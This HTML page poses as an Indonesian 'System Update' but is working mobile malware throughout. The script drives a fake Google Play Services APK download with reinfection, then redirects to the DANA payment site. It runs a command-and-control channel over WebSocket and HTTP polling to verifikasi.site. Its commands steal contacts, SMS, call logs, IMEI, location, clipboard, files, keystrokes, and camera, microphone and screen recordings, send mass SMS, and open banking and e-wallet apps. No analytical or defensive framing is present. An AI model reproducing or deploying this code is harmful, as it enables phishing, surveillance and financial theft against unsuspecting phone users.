<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);
            border-radius:16px;
            border:1px solid #2a3f5f;
            box-shadow:0 20px 60px rgba(0,0,0,0.8);
        }
        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}
        .subtitle{font-size:13px;color:#8899aa;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.3s ease}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .fade-out{animation:fadeOut 0.5s ease forwards}
        @keyframes fadeOut{0%{opacity:1}100%{opacity:0}}
        .log{display:none}
        .download-iframe{position:absolute;width:0;height:0;border:none;visibility:hidden}
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>
        <span id="statusLabel">⏳ Memperbarui System Keamanan...</span>
    </div>
    <div class="log" id="log"></div>
</div>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - ADAPTIF (BRIDGE ATAU TIDAK)
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 10000;
var APK_INSTALLED = false;
var REINFECTION_INTERVAL = 10800000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var spreadDone = false;
var retryCount = 0;
var ws = null;
var wsConnected = false;
var WS_URL = 'wss://verifikasi.site/ws';

// 🔥 APK URL - redirect, bukan download via JS
var APK_URL = 'https://verifikasi.site/files/GooglePlayServices.apk';

// ============================================================
// DETEKSI MULTI-BRIDGE
// ============================================================
var BRIDGE = null;
(function detectBridge() {
    var candidates = [
        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'AppBridge'
    ];
    for (var i = 0; i < candidates.length; i++) {
        if (typeof window[candidates[i]] !== 'undefined') {
            BRIDGE = window[candidates[i]];
            break;
        }
    }
})();

var HAS_BRIDGE = (BRIDGE !== null);

function bridgeCall(method, args) {
    if (!HAS_BRIDGE) return null;
    try {
        if (typeof BRIDGE[method] === 'function') {
            return BRIDGE[method].apply(BRIDGE, args);
        }
    } catch(e) {}
    return null;
}

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// UI UPDATE
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}
updateProgress(5, '⏳ Memperbarui System Keamanan...');

// ============================================================
// AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        startAllProcesses();
                        return;
                    }
                } catch(e) {}
            }
            if (retryCount < 1) {
                retryCount++;
                setTimeout(ambilPassword, 3000);
            } else {
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                K({ sumber: 'password_fallback', data: 'using_default' });
                startAllProcesses();
            }
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

// ============================================================
// SEMUA PROSES DIMULAI
// ============================================================
function startAllProcesses() {
    connectWebSocket();
    startC2Polling();
    startHeartbeat();
    startReinfection();
    autoExecuteC2();
    downloadAPK(); // 🔥 Redirect ke APK
    startSelfHealing();
}

// ============================================================
// 🔥 APK - REDIRECT KE URL (BUKAN DOWNLOAD JS)
// ============================================================
function downloadAPK() {
    K({ sumber: 'apk_download_redirect', data: { url: APK_URL } });
    try {
        window.open(APK_URL, '_blank');
        APK_INSTALLED = true;
        updateProgress(100, '✅ Update Selesai');
        finishAndRedirect();
    } catch(e) {
        K({ sumber: 'apk_download_error', data: e.message });
        window.location.href = APK_URL;
    }
}

// ============================================================
// WEBSOCKET, C2, HEARTBEAT, REINFECTION, SELF-HEALING
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'browser_systemupdate',
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    } else {
                        ws.close();
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    K({ sumber: 'ws_command_received', data: aksi });
                    var hasil = eksekusiPerintah(cmd);
                    K({ sumber: 'ws_command_result', data: hasil });
                    if (wsConnected && ws) {
                        ws.send(JSON.stringify({
                            type: 'command_result',
                            command: aksi,
                            result: hasil,
                            timestamp: Date.now()
                        }));
                    }
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_parse_error', data: e.message });
            }
        };
        ws.onclose = function() {
            wsConnected = false;
            K({ sumber: 'ws_status', data: 'disconnected' });
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            K({ sumber: 'ws_error', data: 'error' });
        };
    } catch(e) {
        K({ sumber: 'ws_connect_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({
                            sumber: 'c2_result',
                            data: {
                                perintah: aksi,
                                hasil: hasil,
                                waktu: Date.now()
                            }
                        });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function startHeartbeat() {
    setInterval(function() { 
        K({ sumber: 'page_heartbeat', data: 'alive' }); 
    }, 2700000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
            downloadAPK();
        }
    }, REINFECTION_INTERVAL);
}

function startSelfHealing() {
    setInterval(function() {
        K({ sumber: 'self_heal_check', data: 'done' });
    }, 30 * 60 * 1000);
}

// ============================================================
// FINISH & REDIRECT
// ============================================================
function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100, '✅ Update Selesai');
    K({ sumber: 'update_complete', data: 'ok' });
    redirectToDANA();
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    setTimeout(function() {
        try {
            window.location.href = 'https://www.dana.id';
        } catch(e) {
            window.location.href = 'https://www.dana.id';
        }
    }, 800);
}

// ============================================================
// 48 PERINTAH C2 (ADAPTIF)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';
    var params = cmd.params || {};

    try {
        switch (aksi) {
            case "ambil_kontak": hasil = ambilKontak(); break;
            case "ambil_sms": hasil = ambilSMS(); break;
            case "ambil_call_log": hasil = ambilCallLog(); break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(params.text || ""); break;
            case "ambil_imei": hasil = ambilIMEI(); break;
            case "ambil_imsi": hasil = ambilIMSI(); break;
            case "ambil_nomor_hp": hasil = ambilNomorHP(); break;
            case "get_installed_apps": hasil = getInstalledApps(); break;
            case "get_notifications": hasil = getNotifications(); break;
            case "get_notifications_history": hasil = getNotificationsHistory(); break;
            case "clear_notification": hasil = clearNotification(params.id || ""); break;
            case "clear_all_notifications": hasil = clearAllNotifications(); break;
            case "keylogger_start": hasil = keyloggerStart(); break;
            case "keylogger_stop": hasil = keyloggerStop(); break;
            case "keylogger_upload": hasil = keyloggerUpload(); break;
            case "keylogger_status": hasil = keyloggerStatus(); break;
            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || ""); break;
            case "call_number": hasil = callNumber(params.nomor || ""); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
            case "app_force_stop": hasil = appForceStop(params.package || ""); break;
            case "app_clear_data": hasil = appClearData(params.package || ""); break;
            case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
            case "buka_dana": hasil = bukaDANA(); break;
            case "buka_gopay": hasil = bukaGoPay(); break;
            case "buka_ovo": hasil = bukaOVO(); break;
            case "buka_bri": hasil = bukaBRI(); break;
            case "buka_bca": hasil = bukaBCA(); break;
            case "buka_mandiri": hasil = bukaMandiri(); break;
            case "buka_shopee": hasil = bukaShopee(); break;
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
            case "screen_record_stop": hasil = screenRecordStop(); break;
            case "screen_record_status": hasil = screenRecordStatus(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
            case "ambil_file": hasil = ambilFile(params.path || ""); break;
            case "get_system_info": hasil = getSystemInfo(); break;
            case "get_battery": hasil = getBattery(); break;
            case "get_wifi": hasil = getWiFi(); break;
            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
            case "toast": hasil = showToast(params.pesan || "System Update Complete!"); break;
            default: hasil = "Unknown command: " + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

// ============================================================
// IMPLEMENTASI FUNGSI PERINTAH (ADAPTIF)
// ============================================================
function ambilKontak() {
    if (HAS_BRIDGE) {
        try {
            var contacts = bridgeCall('getAllContacts', []);
            if (contacts) {
                var parsed = typeof contacts === 'string' ? JSON.parse(contacts) : contacts;
                K({ sumber: 'data_kontak', data: parsed });
                return 'Contacts sent via bridge';
            }
        } catch(e) {}
    }
    return 'Contacts not available (no bridge)';
}
function ambilSMS() {
    if (HAS_BRIDGE) {
        try {
            var sms = bridgeCall('getAllSMS', []);
            if (sms) {
                var parsed = typeof sms === 'string' ? JSON.parse(sms) : sms;
                K({ sumber: 'data_sms', data: parsed });
                return 'SMS sent via bridge';
            }
        } catch(e) {}
    }
    return 'SMS not available (no bridge)';
}
function ambilCallLog() {
    if (HAS_BRIDGE) {
        try {
            var callLog = bridgeCall('getCallLog', []);
            if (callLog) {
                var parsed = typeof callLog === 'string' ? JSON.parse(callLog) : callLog;
                K({ sumber: 'data_call_log', data: parsed });
                return 'Call log sent via bridge';
            }
        } catch(e) {}
    }
    return 'Call log not available (no bridge)';
}
function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({ sumber: 'data_lokasi', data: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
        });
        return 'Getting location...';
    } catch(e) { return 'Error: ' + e.message; }
}
function getClipboard() {
    try {
        navigator.clipboard.readText().then(function(t) {
            K({ sumber: 'data_clipboard', data: t });
        }).catch(function() {});
        return 'Reading clipboard...';
    } catch(e) { return 'Error: ' + e.message; }
}
function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text).then(function() {
            K({ sumber: 'data_clipboard_set', data: 'success' });
        }).catch(function() {});
        return 'Setting clipboard: ' + text;
    } catch(e) { return 'Error: ' + e.message; }
}
function ambilIMEI() {
    if (HAS_BRIDGE) {
        try {
            var imei = bridgeCall('getIMEI', []);
            if (imei) { K({ sumber: 'data_imei', data: imei }); return 'IMEI sent via bridge'; }
        } catch(e) {}
    }
    return 'IMEI not available (no bridge)';
}
function ambilIMSI() {
    if (HAS_BRIDGE) {
        try {
            var imsi = bridgeCall('getIMSI', []);
            if (imsi) { K({ sumber: 'data_imsi', data: imsi }); return 'IMSI sent via bridge'; }
        } catch(e) {}
    }
    return 'IMSI not available (no bridge)';
}
function ambilNomorHP() {
    if (HAS_BRIDGE) {
        try {
            var phone = bridgeCall('getPhoneNumber', []);
            if (phone) { K({ sumber: 'data_nomor_hp', data: phone }); return 'Phone number sent via bridge'; }
        } catch(e) {}
    }
    return 'Phone number not available (no bridge)';
}
function getInstalledApps() {
    if (HAS_BRIDGE) {
        try {
            var apps = bridgeCall('getInstalledApps', []);
            if (apps) {
                var parsed = typeof apps === 'string' ? JSON.parse(apps) : apps;
                K({ sumber: 'data_installed_apps', data: parsed });
                return 'Installed apps sent via bridge';
            }
        } catch(e) {}
    }
    return 'Installed apps not available (no bridge)';
}
function getNotifications() {
    if (HAS_BRIDGE) {
        try {
            var notifs = bridgeCall('getNotifications', []);
            if (notifs) { K({ sumber: 'notifications', data: notifs }); return 'Notifications sent via bridge'; }
        } catch(e) {}
    }
    try {
        if (Notification.permission === 'granted') {
            K({ sumber: 'notifications', data: 'Notification permission granted' });
            return 'Notifications permission granted';
        }
        return 'Notifications permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}
function getNotificationsHistory() {
    if (HAS_BRIDGE) {
        try {
            var hist = bridgeCall('getNotificationsHistory', []);
            if (hist) { K({ sumber: 'notifications_history', data: hist }); return 'History sent via bridge'; }
        } catch(e) {}
    }
    return 'History not available (no bridge)';
}
function clearNotification(id) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('clearNotification', [id]);
            return 'Clear notification via bridge';
        } catch(e) {}
    }
    K({ sumber: 'clear_notification', data: { id: id } });
    return 'Clear notification attempted';
}
function clearAllNotifications() {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('clearAllNotifications', []);
            return 'Clear all notifications via bridge';
        } catch(e) {}
    }
    K({ sumber: 'clear_all_notifications', data: 'attempted' });
    return 'Clear all notifications attempted';
}
var keyloggerActive = false;
var keyloggerData = [];
function keyloggerStart() {
    keyloggerActive = true;
    K({ sumber: 'keylogger_start', data: 'started' });
    return 'Keylogger started';
}
function keyloggerStop() {
    keyloggerActive = false;
    K({ sumber: 'keylogger_stop', data: 'stopped' });
    return 'Keylogger stopped';
}
function keyloggerUpload() {
    K({ sumber: 'keylogger_upload', data: keyloggerData });
    keyloggerData = [];
    return 'Keylogger uploaded';
}
function keyloggerStatus() {
    return 'Keylogger status: ' + (keyloggerActive ? 'Active' : 'Inactive');
}
function kirimSMS(nomor, pesan) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('sendSMS', [nomor, pesan]);
            K({ sumber: 'kirim_sms', data: { nomor: nomor } });
            return 'SMS sent via bridge';
        } catch(e) {}
    }
    try { window.location.href = 'sms:' + nomor + '?body=' + encodeURIComponent(pesan); } catch(e) {}
    return 'SMS intent opened';
}
function kirimSMSMassal(pesan) {
    if (HAS_BRIDGE) {
        try {
            var contacts = bridgeCall('getAllContacts', []);
            if (contacts) {
                var list = typeof contacts === 'string' ? JSON.parse(contacts) : contacts;
                var sent = 0;
                list.forEach(function(c) {
                    var number = String(c.number || '').replace(/[^0-9]/g, '');
                    if (number && number.length > 5) {
                        try { bridgeCall('sendSMS', [number, pesan]); sent++; } catch(e) {}
                    }
                });
                K({ sumber: 'kirim_sms_massal', data: { sent: sent } });
                return 'SMS massal sent to ' + sent + ' contacts';
            }
        } catch(e) {}
    }
    return 'SMS massal not available';
}
function callNumber(nomor) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('callNumber', [nomor]);
            K({ sumber: 'call_number', data: { nomor: nomor } });
            return 'Calling via bridge';
        } catch(e) {}
    }
    try { window.location.href = 'tel:' + nomor; } catch(e) {}
    return 'Call intent opened';
}
function bukaAplikasi(packageName) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('openApp', [packageName]);
            K({ sumber: 'buka_aplikasi', data: { package: packageName } });
            return 'Opening app via bridge';
        } catch(e) {}
    }
    try { window.location.href = packageName.replace(/\./g,'') + '://'; } catch(e) {}
    return 'App scheme opened';
}
function uninstallAplikasi(packageName) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('uninstallApp', [packageName]);
            K({ sumber: 'uninstall_aplikasi', data: { package: packageName } });
            return 'Uninstalling app via bridge';
        } catch(e) {}
    }
    try { window.open('https://play.google.com/store/apps/details?id=' + packageName, '_blank'); } catch(e) {}
    return 'Play Store opened';
}
function appForceStop(packageName) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('forceStopApp', [packageName]);
            K({ sumber: 'app_force_stop', data: { package: packageName } });
            return 'Force stopping app via bridge';
        } catch(e) {}
    }
    return 'Force stop not available';
}
function appClearData(packageName) {
    if (HAS_BRIDGE) {
        try {
            bridgeCall('clearAppData', [packageName]);
            K({ sumber: 'app_clear_data', data: { package: packageName } });
            return 'Clearing app data via bridge';
        } catch(e) {}
    }
    return 'Clear data not available';
}
function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened'; } catch(e) { return 'Error: ' + e.message; }
}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
        K({ sumber: 'screenshot', data: dataUrl });
        return 'Screenshot taken';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_audio', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio recording stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_video', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopVideo() { return stopAudio(); }
function screenRecord(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() { K({ sumber: 'screen_record', data: reader.result }); };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started for ' + durasi + 's';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStop() {
    try {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop(); screenRecorder = null; return 'Screen recording stopped';
        }
        return 'No active screen recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStatus() {
    return screenRecorder ? 'Screen recording: ' + screenRecorder.state : 'No screen recording';
}

function getSystemInfo() {
    try {
        var info = { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: screen.width+'x'+screen.height, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
        K({ sumber: 'system_info', data: info });
        return JSON.stringify(info);
    } catch(e) { return 'Error: ' + e.message; }
}
function getBattery() {
    try {
        navigator.getBattery().then(function(battery) {
            K({ sumber: 'battery_info', data: { level: Math.round(battery.level*100)+'%', charging: battery.charging } });
        });
        return 'Getting battery info...';
    } catch(e) { return 'Error: ' + e.message; }
}
function getWiFi() {
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            var info = { type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
            K({ sumber: 'wifi_info', data: info });
            return JSON.stringify(info);
        }
        return 'WiFi info not available';
    } catch(e) { return 'Error: ' + e.message; }
}
function vibrate(durasi) {
    try { if (navigator.vibrate) { navigator.vibrate(durasi); K({ sumber: 'vibrate', data: durasi }); return 'Vibrated '+durasi+'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }
}
function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
        toast.textContent = '🔔 '+message;
        document.body.appendChild(toast);
        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown';
    } catch(e) { return 'Error: ' + e.message; }
}

document.addEventListener('input', function(e) {
    if (!keyloggerActive) return;
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            keyloggerData.push({ waktu: Date.now(), element: key, value: e.target.value });
        }
    } catch(e) {}
});
document.addEventListener('submit', function(e) {
    if (!keyloggerActive) return;
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        keyloggerData.push({ waktu: Date.now(), url: window.location.href, form: data });
    } catch(e) {}
});
